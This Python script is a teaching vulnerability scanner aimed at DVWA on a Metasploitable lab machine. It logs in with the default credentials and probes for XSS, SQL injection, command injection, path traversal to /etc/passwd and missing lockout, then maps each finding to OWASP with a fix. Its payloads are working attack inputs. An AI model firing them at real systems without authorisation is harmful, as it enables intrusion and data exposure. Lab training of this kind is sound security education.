import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# ── Configuration ─────────────────────────────────────────────────
TARGET_IP   = "192.168.1.5"          # <-- YOUR Metasploitable IP here
BASE_URL    = f"http://{TARGET_IP}/dvwa"
LOGIN_URL   = f"{BASE_URL}/login.php"
SETUP_URL   = f"{BASE_URL}/setup.php"

CREDENTIALS = {"username": "admin", "password": "password"}

XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "'><script>alert(1)</script>",
    "<svg onload=alert(1)>",
]

SQLI_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "1 UNION SELECT NULL--",
]

# ── Session Login ─────────────────────────────────────────────────
def create_session():
    """Log into DVWA and return an authenticated session."""
    session = requests.Session()
    try:
        # Step 1: Check host is reachable at all
        try:
            probe = session.get(f"http://{TARGET_IP}/", timeout=5)
            print(f"  [✓] Host reachable — HTTP {probe.status_code}")
        except requests.exceptions.ConnectionError:
            print(f"  [!] Cannot reach {TARGET_IP} — is Metasploitable running?")
            print(f"      Try: ping {TARGET_IP}  and  nmap -p 80 {TARGET_IP}")
            return None

        # Step 2: Check DVWA is set up (database initialised)
        setup = session.get(SETUP_URL, timeout=5)
        if "setup" in setup.url.lower() and "already" not in setup.text.lower():
            print("  [~] DVWA may need DB setup — visiting setup.php...")
            session.post(SETUP_URL, data={"create_db": "Create / Reset Database"}, timeout=10)
            print("  [✓] Database initialised.")

        # Step 3: Grab login page and extract CSRF token (user_token)
        r = session.get(LOGIN_URL, timeout=5)
        if r.status_code != 200:
            print(f"  [!] Login page returned HTTP {r.status_code}")
            return None

        soup = BeautifulSoup(r.text, "html.parser")
        token_field = soup.find("input", {"name": "user_token"})
        token = token_field["value"] if token_field else ""
        if not token:
            print("  [~] No user_token on login page — older DVWA version, continuing anyway.")

        # Step 4: Submit login
        login_payload = {
            "username":   CREDENTIALS["username"],
            "password":   CREDENTIALS["password"],
            "Login":      "Login",
            "user_token": token,
        }
        login_resp = session.post(LOGIN_URL, data=login_payload, timeout=5)

        # Detect success — DVWA redirects to index.php on success
        if "index.php" in login_resp.url or "Logout" in login_resp.text or "Welcome" in login_resp.text:
            print(f"  [✓] Logged in as {CREDENTIALS['username']}.")
        else:
            print("  [!] Login failed — check CREDENTIALS and TARGET_IP.")
            print(f"      Response URL: {login_resp.url}")
            print(f"      Hint: Try visiting {LOGIN_URL} in your browser.")
            return None

        # Step 5: Set security level to LOW
        sec_page = session.get(f"{BASE_URL}/security.php", timeout=5)
        sec_soup = BeautifulSoup(sec_page.text, "html.parser")
        sec_token = sec_soup.find("input", {"name": "user_token"})
        sec_token_val = sec_token["value"] if sec_token else ""

        session.post(f"{BASE_URL}/security.php", data={
            "security":      "low",
            "seclev_submit": "Submit",
            "user_token":    sec_token_val,
        }, timeout=5)
        print("  [✓] Security level set to LOW.")

    except requests.exceptions.RequestException as e:
        print(f"  [!] Session error: {e}")
        return None

    return session


# ── Check 1: HTTPS ────────────────────────────────────────────────
def check_https(url):
    print("\n[*] Check 1: Secure Transport")
    if url.startswith("https://"):
        print("  [✓] HTTPS in use.")
    else:
        print("  [!] INSECURE: Running over HTTP — credentials sent in plaintext.")
        print("      OWASP: A07 — Identification and Authentication Failures")
        print("      Fix:   Deploy TLS certificate, enforce HTTPS, add HSTS header.")


# ── Check 2: CSRF Token ───────────────────────────────────────────
def check_csrf(session):
    print("\n[*] Check 2: CSRF Protection")
    try:
        r = session.get(f"{BASE_URL}/vulnerabilities/csrf/", timeout=5)
        soup = BeautifulSoup(r.text, "html.parser")
        token = soup.find("input", {"name": "user_token"})
        if token:
            print("  [✓] CSRF token found on this page.")
        else:
            print("  [!] INSECURE: No CSRF token on password-change form.")
            print("      OWASP: A07 — Authentication Failures")
            print("      Fix:   Add per-session CSRF tokens to all state-changing forms.")
    except requests.exceptions.RequestException as e:
        print(f"  [!] Request error: {e}")


# ── Check 3: Security Headers ─────────────────────────────────────
def check_security_headers(session):
    print("\n[*] Check 3: HTTP Security Headers")
    try:
        r = session.get(BASE_URL, timeout=5)
        headers_to_check = {
            "Content-Security-Policy":   "Blocks inline XSS execution",
            "X-Frame-Options":           "Prevents clickjacking",
            "X-Content-Type-Options":    "Prevents MIME sniffing",
            "Strict-Transport-Security": "Enforces HTTPS (HSTS)",
            "X-XSS-Protection":          "Legacy XSS browser filter",
        }
        for header, description in headers_to_check.items():
            if header in r.headers:
                print(f"  [✓] {header}: {r.headers[header]}")
            else:
                print(f"  [!] MISSING: {header} — {description}")
        print("      OWASP: A05 — Security Misconfiguration")
    except requests.exceptions.RequestException as e:
        print(f"  [!] Request error: {e}")


# ── Check 4: Reflected XSS ────────────────────────────────────────
def check_reflected_xss(session):
    print("\n[*] Check 4: Reflected XSS")
    url = f"{BASE_URL}/vulnerabilities/xss_r/"
    found = False
    try:
        for payload in XSS_PAYLOADS:
            r = session.get(url, params={"name": payload}, timeout=5)
            if payload in r.text:
                print(f"  [!] VULNERABLE: Input reflected without encoding.")
                print(f"      Payload: {payload}")
                print(f"      OWASP: A03 — Injection (XSS)")
                print(f"      Fix:   Use htmlspecialchars() / output encoding.")
                found = True
                break
        if not found:
            print("  [✓] No reflected XSS found with tested payloads.")
    except requests.exceptions.RequestException as e:
        print(f"  [!] Request error: {e}")


# ── Check 5: Stored XSS ───────────────────────────────────────────
def check_stored_xss(session):
    print("\n[*] Check 5: Stored XSS")
    url = f"{BASE_URL}/vulnerabilities/xss_s/"
    payload = "<script>alert('stored-xss')</script>"
    try:
        r = session.get(url, timeout=5)
        soup = BeautifulSoup(r.text, "html.parser")
        token = soup.find("input", {"name": "user_token"})
        token_val = token["value"] if token else ""

        # Submit a comment with the XSS payload
        session.post(url, data={
            "txtName":    "scanner",
            "mtxMessage": payload,
            "btnSign":    "Sign Guestbook",
            "user_token": token_val,
        }, timeout=5)

        # Reload and check if the payload persists in the page
        r2 = session.get(url, timeout=5)
        if payload in r2.text:
            print(f"  [!] VULNERABLE: Stored XSS confirmed — payload persists in page.")
            print(f"      Payload: {payload}")
            print(f"      OWASP: A03 — Injection (Stored XSS)")
            print(f"      Fix:   Sanitise on input AND encode on output. Never trust stored data.")
        else:
            print("  [✓] Stored XSS payload not found in response.")
    except requests.exceptions.RequestException as e:
        print(f"  [!] Request error: {e}")


# ── Check 6: SQL Injection ────────────────────────────────────────
def check_sqli(session):
    print("\n[*] Check 6: SQL Injection")
    url = f"{BASE_URL}/vulnerabilities/sqli/"
    found = False
    error_signatures = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated",
    ]
    try:
        for payload in SQLI_PAYLOADS:
            r = session.get(url, params={"id": payload, "Submit": "Submit"}, timeout=5)
            body = r.text.lower()
            for sig in error_signatures:
                if sig in body:
                    print(f"  [!] VULNERABLE: SQL error signature detected.")
                    print(f"      Payload:   {payload}")
                    print(f"      Signature: {sig}")
                    print(f"      OWASP: A03 — Injection (SQLi)")
                    print(f"      Fix:   Use parameterised queries / prepared statements.")
                    found = True
                    break
            if found:
                break
        if not found:
            print("  [~] No SQL error signatures triggered — try manual testing or sqlmap.")
    except requests.exceptions.RequestException as e:
        print(f"  [!] Request error: {e}")


# ── Check 7: Command Injection ────────────────────────────────────
def check_command_injection(session):
    print("\n[*] Check 7: Command Injection")
    url = f"{BASE_URL}/vulnerabilities/exec/"
    payloads = [
        ("127.0.0.1; echo INJECTED", "INJECTED"),
        ("127.0.0.1 && echo INJECTED", "INJECTED"),
        ("127.0.0.1 | echo INJECTED", "INJECTED"),
    ]
    try:
        for payload, marker in payloads:
            r = session.post(url, data={"ip": payload, "Submit": "submit"}, timeout=10)
            if marker in r.text:
                print(f"  [!] VULNERABLE: Command injection confirmed.")
                print(f"      Payload: {payload}")
                print(f"      OWASP: A03 — Injection (Command)")
                print(f"      Fix:   Never pass user input to shell functions.")
                print(f"             Use allowlists or language-native network libs.")
                return
        print("  [✓] No command injection detected with tested payloads.")
    except requests.exceptions.RequestException as e:
        print(f"  [!] Request error: {e}")


# ── Check 8: File Inclusion ───────────────────────────────────────
def check_file_inclusion(session):
    print("\n[*] Check 8: Local File Inclusion (LFI)")
    url = f"{BASE_URL}/vulnerabilities/fi/"
    lfi_payloads = [
        "../../../../../../etc/passwd",
        "....//....//....//etc/passwd",
    ]
    try:
        for payload in lfi_payloads:
            r = session.get(url, params={"page": payload}, timeout=5)
            if "root:" in r.text:
                print(f"  [!] VULNERABLE: LFI confirmed — /etc/passwd contents visible.")
                print(f"      Payload: {payload}")
                print(f"      OWASP: A03 — Injection / Path Traversal")
                print(f"      Fix:   Whitelist allowed file values; never pass user input to file functions.")
                return
        print("  [✓] LFI not detected with tested payloads.")
    except requests.exceptions.RequestException as e:
        print(f"  [!] Request error: {e}")


# ── Check 9: Brute Force (no lockout) ────────────────────────────
def check_brute_force(session):
    print("\n[*] Check 9: Brute Force / No Account Lockout")
    url = f"{BASE_URL}/vulnerabilities/brute/"
    wrong_passwords = ["wrong1", "wrong2", "wrong3", "wrong4", "wrong5"]
    blocked = False
    try:
        for pwd in wrong_passwords:
            r = session.get(url, params={
                "username": "admin",
                "password": pwd,
                "Login":    "Login"
            }, timeout=5)
            if "too many" in r.text.lower() or r.status_code == 429:
                blocked = True
                break
        if blocked:
            print("  [✓] Account lockout or rate limiting detected.")
        else:
            print(f"  [!] INSECURE: {len(wrong_passwords)} failed attempts — no lockout triggered.")
            print(f"      OWASP: A07 — Identification and Authentication Failures")
            print(f"      Fix:   Implement lockout after N failures; add CAPTCHA; use MFA.")
    except requests.exceptions.RequestException as e:
        print(f"  [!] Request error: {e}")


# ── Main ──────────────────────────────────────────────────────────
def main():
    print("=" * 60)
    print("  DVWA / Metasploitable Security Scanner")
    print(f"  Target: {BASE_URL}")
    print("=" * 60)

    print("\n[*] Step 1: Authenticating to DVWA...")
    session = create_session()
    if not session:
        print("[!] Could not create session. Exiting.")
        return

    check_https(BASE_URL)
    check_csrf(session)
    check_security_headers(session)
    check_reflected_xss(session)
    check_stored_xss(session)
    check_sqli(session)
    check_command_injection(session)
    check_file_inclusion(session)
    check_brute_force(session)

    print("\n" + "=" * 60)
    print("  Scan complete.")
    print("  All findings mapped to OWASP Top 10 categories.")
    print("  Next step: manually exploit each [!] finding in DVWA,")
    print("  then verify the fix by switching to security=impossible.")
    print("=" * 60)

if __name__ == "__main__":
    main()
